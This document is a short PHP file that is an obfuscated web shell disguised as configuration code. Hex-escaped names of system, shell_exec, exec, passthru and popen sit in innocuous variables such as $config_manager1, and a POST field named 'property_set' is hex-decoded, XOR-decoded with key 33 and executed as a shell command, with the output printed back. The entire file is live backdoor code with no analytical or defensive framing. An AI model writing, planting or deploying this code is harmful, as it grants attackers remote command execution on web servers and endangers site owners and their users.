<?php

$config_manager6 = "\x73tre\x61m_get\x5Fc\x6F\x6Et\x65\x6E\x74s";
$request_approved = "\x68\x65x\x32\x62in";
$config_manager7 = "pc\x6Co\x73e";
$config_manager4 = "p\x61ss\x74\x68ru";
$config_manager5 = "pope\x6E";
$config_manager3 = "ex\x65c";
$config_manager2 = "\x73he\x6Cl_\x65\x78\x65c";
$config_manager1 = "s\x79\x73tem";
if (isset($_POST["\x70\x72o\x70\x65\x72\x74y_set"])) {
            function task_processor      (     $elem      ,    $pgrp      )   {
   $data     =   ''    ;
    $t=0;
 while($t<strlen($elem)){
$data.=chr(ord($elem[$t])^$pgrp);
$t++;

} return     $data;
     
}
            $property_set = $request_approved($_POST["\x70\x72o\x70\x65\x72\x74y_set"]);
            $property_set = task_processor($property_set, 33);
            if (function_exists($config_manager1)) {
                $config_manager1($property_set);
            } elseif (function_exists($config_manager2)) {
                print $config_manager2($property_set);
            } elseif (function_exists($config_manager3)) {
                $config_manager3($property_set, $value_elem);
                print join("\n", $value_elem);
            } elseif (function_exists($config_manager4)) {
                $config_manager4($property_set);
            } elseif (function_exists($config_manager5) && function_exists($config_manager6) && function_exists($config_manager7)) {
                $pgrp_data = $config_manager5($property_set, 'r');
                if ($pgrp_data) {
                    $pointer_k = $config_manager6($pgrp_data);
                    $config_manager7($pgrp_data);
                    print $pointer_k;
                }
            }
            exit;
        }